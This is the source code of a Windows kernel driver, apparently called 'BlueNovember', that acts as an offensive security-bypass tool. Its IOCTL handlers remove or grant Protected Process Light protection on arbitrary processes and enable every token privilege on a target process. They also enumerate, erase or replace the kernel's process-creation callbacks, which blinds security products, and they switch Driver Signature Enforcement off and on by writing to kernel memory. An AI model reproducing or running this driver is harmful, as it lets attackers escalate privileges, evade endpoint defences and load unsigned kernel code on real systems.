#include <ntifs.h>
#include <ntddk.h>
#include <aux_klib.h>

#include "IOCTLs.h"
#include "Common.h"
#include "Processes.h"
#include "WindowsVersions.h"
#pragma warning(disable: 6385)
#pragma warning(disable: 4996)

void DriverCleanup(PDRIVER_OBJECT DriverObject);
NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

WINDOWS_VERSION GetWindowsVersion();
ULONG64 FindPspSetCreateProcessNotify(WINDOWS_VERSION WindowsVersion);
void SearchLoadedModules(CALLBACK_INFORMATION* ModuleInfo);

UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\BlueNovember");
UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\BlueNovember");

extern "C"
NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = DriverCleanup;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

	PDEVICE_OBJECT deviceObject;
	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&deviceObject
	);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] Failed to create Device Object (0x%08X)\n", status));
		return status;
	}

	status = IoCreateSymbolicLink(&symlink, &deviceName);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] Failed to create symlink (0x%08X)\n", status));
		IoDeleteDevice(deviceObject);
		return status;
	}

	return STATUS_SUCCESS;
}

NTSTATUS
DeviceControl(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	ULONG_PTR length = 0;

	// check Windows version
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();

	/*if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		status = STATUS_NOT_SUPPORTED;
		KdPrint(("[!] Windows Version Unsupported\n"));

		Irp->IoStatus.Status = status;
		Irp->IoStatus.Information = length;

		IoCompleteRequest(Irp, IO_NO_INCREMENT);

		return status;
	}
	*/
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case BLUE_NOVEMBER_UNPROTECT_PROCESS:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		TargetProcess* target = (TargetProcess*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (target == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		// dt nt!_EPROCESS
		PEPROCESS eProcess = NULL;
		status = PsLookupProcessByProcessId((HANDLE)target->ProcessId, &eProcess);

		if (!NT_SUCCESS(status))
		{
			KdPrint(("[!] PsLookupProcessByProcessId failed (0x%08X)\n", status));
			break;
		}

		KdPrint(("[+] Got EPROCESS for PID %d (0x%08p)\n", target->ProcessId, eProcess));

		PROCESS_PROTECTION_INFO* psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[windowsVersion]);

		if (psProtection == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] Failed to read PROCESS_PROTECTION_INFO\n"));
			break;
		}

		KdPrint(("[+] Removing Process Protection for PID %d\n", target->ProcessId));

		// null the values
		psProtection->SignatureLevel = 0;
		psProtection->SectionSignatureLevel = 0;
		psProtection->Protection.Type = 0;
		psProtection->Protection.Signer = 0;

		// dereference eProcess
		ObDereferenceObject(eProcess);

		break;
	}
	case BLUE_NOVEMBER_PROTECT_PROCESS:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		TargetProcess* target = (TargetProcess*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (target == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		// dt nt!_EPROCESS
		PEPROCESS eProcess = NULL;
		status = PsLookupProcessByProcessId((HANDLE)target->ProcessId, &eProcess);

		if (!NT_SUCCESS(status))
		{
			KdPrint(("[!] PsLookupProcessByProcessId failed (0x%08X)\n", status));
			break;
		}

		KdPrint(("[+] Got EPROCESS for PID %d (0x%08p)\n", target->ProcessId, eProcess));

		PROCESS_PROTECTION_INFO* psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[windowsVersion]);

		if (psProtection == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] Failed to read PROCESS_PROTECTION_INFO\n"));
			ObDereferenceObject(eProcess);
			break;
		}

		KdPrint(("[+] Setting Process Protection for PID %d\n", target->ProcessId));

		// set the values
		psProtection->SignatureLevel = 30;
		psProtection->SectionSignatureLevel = 28;
		psProtection->Protection.Type = 2;
		psProtection->Protection.Signer = 6;

		// dereference eProcess
		ObDereferenceObject(eProcess);

		break;
	}
	case BLUE_NOVEMBER_PROCESS_PRIVILEGE:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		TargetProcess* target = (TargetProcess*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (target == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		// dt nt!_EPROCESS
		PEPROCESS eProcess = NULL;
		status = PsLookupProcessByProcessId((HANDLE)target->ProcessId, &eProcess);

		// dt nt!_TOKEN
		PACCESS_TOKEN pToken = PsReferencePrimaryToken(eProcess);
		PPROCESS_PRIVILEGES tokenPrivs = (PPROCESS_PRIVILEGES)((ULONG_PTR)pToken + PROCESS_PRIVILEGE_OFFSET[windowsVersion]);

		// yolo enable all the things
		tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = 0xff;
		tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = 0xff;
		tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = 0xff;
		tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = 0xff;
		tokenPrivs->Present[4] = tokenPrivs->Enabled[4] = 0xff;

		PsDereferencePrimaryToken(pToken);
		ObDereferenceObject(eProcess);

		break;
	}
	case BLUE_NOVEMBER_ENUM_PROCESS_CALLBACKS:
	{
		ULONG szBuffer = sizeof(CALLBACK_INFORMATION) * 64;

		if (stack->Parameters.DeviceIoControl.OutputBufferLength < szBuffer)
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		CALLBACK_INFORMATION* userBuffer = (CALLBACK_INFORMATION*)Irp->UserBuffer;

		if (userBuffer == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		ULONG64 pspSetCreateProcessNotify = FindPspSetCreateProcessNotify(windowsVersion);

		if (pspSetCreateProcessNotify == 0)
		{
			status = STATUS_NOT_FOUND;
			break;
		}

		for (ULONG i = 0; i < 64; i++)
		{
			// 64 bit addresses are 8 bytes
			ULONG64 pCallback = pspSetCreateProcessNotify + (i * 8);
			ULONG64 callback = *(PULONG64)(pCallback);

			userBuffer[i].Pointer = callback;

			if (callback > 0)
			{
				SearchLoadedModules(&userBuffer[i]);
			}

			length += sizeof(CALLBACK_INFORMATION);
		}

		break;
	}
	case BLUE_NOVEMBER_ZERO_PROCESS_CALLBACK:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetCallback))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		TargetCallback* target = (TargetCallback*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (target == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		// sanity check value
		if (target->Index < 0 || target->Index > 64)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		ULONG64 pspSetCreateProcessNotify = FindPspSetCreateProcessNotify(windowsVersion);

		// iterate over until we hit target index
		for (LONG i = 0; i < 64; i++)
		{
			if (i == target->Index)
			{
				ULONG64 pCallback = pspSetCreateProcessNotify + (i * 8);
				*(PULONG64)(pCallback) = (ULONG64)0;

				break;
			}
		}

		break;
	}
	case BLUE_NOVEMBER_ADD_PROCESS_CALLBACK:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(NewCallback))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		NewCallback* newCallback = (NewCallback*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (newCallback == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		ULONG64 pspSetCreateProcessNotify = FindPspSetCreateProcessNotify(windowsVersion);

		// iterate over until we hit target index
		for (LONG i = 0; i < 64; i++)
		{
			if (i == newCallback->Index)
			{
				ULONG64 pCallback = pspSetCreateProcessNotify + (i * 8);
				*(PULONG64)(pCallback) = newCallback->Pointer;

				break;
			}
		}

		break;
	}
	case BLUE_NOVEMBER_ENUM_DSE:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(DSE))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		DSE* dse = (DSE*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (dse == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		ULONG szBuffer = sizeof(ULONG);

		if (stack->Parameters.DeviceIoControl.OutputBufferLength < szBuffer)
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		ULONG* userBuffer = (ULONG*)Irp->UserBuffer;
		*userBuffer = *(PULONG)(dse->Address);

		break;
	}
	case BLUE_NOVEMBER_DISABLE_DSE:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(DSE))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		DSE* dse = (DSE*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (dse == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		*(PULONG64)(dse->Address) = (ULONG)0x00e;

		break;
	}
	case BLUE_NOVEMBER_ENABLE_DSE:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(DSE))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
			break;
		}

		DSE* dse = (DSE*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (dse == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
			break;
		}

		*(PULONG64)(dse->Address) = (ULONG)0x006;

		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrint(("[!] STATUS_INVALID_DEVICE_REQUEST\n"));
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = length;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

ULONG64
FindPspSetCreateProcessNotify(
	WINDOWS_VERSION WindowsVersion)
{
	UNICODE_STRING functionName;
	RtlInitUnicodeString(&functionName, L"PsSetCreateProcessNotifyRoutine");

	ULONG64 psSetCreateProcessNotify = 0;
	psSetCreateProcessNotify = (ULONG64)MmGetSystemRoutineAddress(&functionName);

	if (psSetCreateProcessNotify == 0)
	{
		KdPrint(("[!] Failed to find PsSetCreateProcessNotifyRoutine\n"));
		return 0;
	}

	KdPrint(("[+] PsSetCreateProcessNotifyRoutine found @ 0x%llX\n", psSetCreateProcessNotify));

	ULONG64	i = 0;
	ULONG64 pspSetCreateProcessNotify = 0;
	LONG offset = 0;

	// Search for CALL/JMP
	for (i = psSetCreateProcessNotify; i < psSetCreateProcessNotify + 0x14; i++)
	{
		if ((*(PUCHAR)i == PSP_OPCODE[WindowsVersion]))
		{
			KdPrint(("[+] CALL/JMP found @ 0x%llX\n", i));
			RtlCopyMemory(&offset, (PUCHAR)(i + 1), 4);
			pspSetCreateProcessNotify = i + offset + 5;
			break;
		}
	}

	if (pspSetCreateProcessNotify == 0)
	{
		KdPrint(("[+] Failed to find PspSetCreateProcessNotifyRoutine\n"));
		return 0;
	}

	KdPrint(("[+] PspSetCreateProcessNotifyRoutine found @ 0x%llX\n", pspSetCreateProcessNotify));

	// Search for LEA
	offset = 0;
	for (i = pspSetCreateProcessNotify; i < pspSetCreateProcessNotify + 0x64; i++)
	{
		if ((*(PUCHAR)i == OPCODE_LEA))
		{
			KdPrint(("[+] LEA found @ 0x%llX\n", i));
			RtlCopyMemory(&offset, (PUCHAR)(i + 2), 4);

			ULONG64 pArray = i + offset + 6;
			KdPrint(("[+] PspSetCreateProcessNotifyRoutine array found @ 0x%llX\n", pArray));
			return pArray;
		}
	}

	return 0;
}

void
SearchLoadedModules(
	CALLBACK_INFORMATION* ModuleInfo)
{
	NTSTATUS status = AuxKlibInitialize();

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] AuxKlibInitialize failed (0x%08X)", status));
		return;
	}

	ULONG szBuffer = 0;

	// run once to get required buffer size
	status = AuxKlibQueryModuleInformation(
		&szBuffer,
		sizeof(AUX_MODULE_EXTENDED_INFO),
		NULL);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] AuxKlibQueryModuleInformation failed (0x%08X)", status));
		return;
	}

	// allocate memory
	AUX_MODULE_EXTENDED_INFO* modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(
		PagedPool,
		szBuffer,
		BLUE_NOVEMBER_TAG);

	if (modules == nullptr)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		return;
	}

	RtlZeroMemory(modules, szBuffer);

	// run again to get the info
	status = AuxKlibQueryModuleInformation(
		&szBuffer,
		sizeof(AUX_MODULE_EXTENDED_INFO),
		modules);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] AuxKlibQueryModuleInformation failed (0x%08X)", status));
		ExFreePoolWithTag(modules, BLUE_NOVEMBER_TAG);
		return;
	}

	// iterate over each module
	ULONG numberOfModules = szBuffer / sizeof(AUX_MODULE_EXTENDED_INFO);

	for (ULONG i = 0; i < numberOfModules; i++)
	{
		ULONG64 startAddress = (ULONG64)modules[i].BasicInfo.ImageBase;
		ULONG imageSize = modules[i].ImageSize;
		ULONG64 endAddress = (ULONG64)(startAddress + imageSize);

		ULONG64 rawPointer = *(PULONG64)(ModuleInfo->Pointer & 0xfffffffffffffff8);

		if (rawPointer > startAddress && rawPointer < endAddress)
		{
			strcpy(ModuleInfo->ModuleName, (CHAR*)(modules[i].FullPathName + modules[i].FileNameOffset));
			break;
		}
	}

	ExFreePoolWithTag(modules, BLUE_NOVEMBER_TAG);
	return;
}

NTSTATUS
CreateClose(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

void
DriverCleanup(
	PDRIVER_OBJECT DriverObject)
{
	IoDeleteSymbolicLink(&symlink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

WINDOWS_VERSION
GetWindowsVersion()
{
	RTL_OSVERSIONINFOW info;
	info.dwOSVersionInfoSize = sizeof(info);

	NTSTATUS status = RtlGetVersion(&info);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] RtlGetVersion failed (0x%08X)\n", status));
		return WINDOWS_UNSUPPORTED;
	}

	KdPrint(("[+] Windows Version %d.%d\n", info.dwMajorVersion, info.dwBuildNumber));

	if (info.dwMajorVersion != 10)
	{
		return WINDOWS_UNSUPPORTED;
	}

	switch (info.dwBuildNumber)
	{
	case 17763:
		return WINDOWS_REDSTONE_5;

	default:
		return WINDOWS_UNSUPPORTED;
	}
}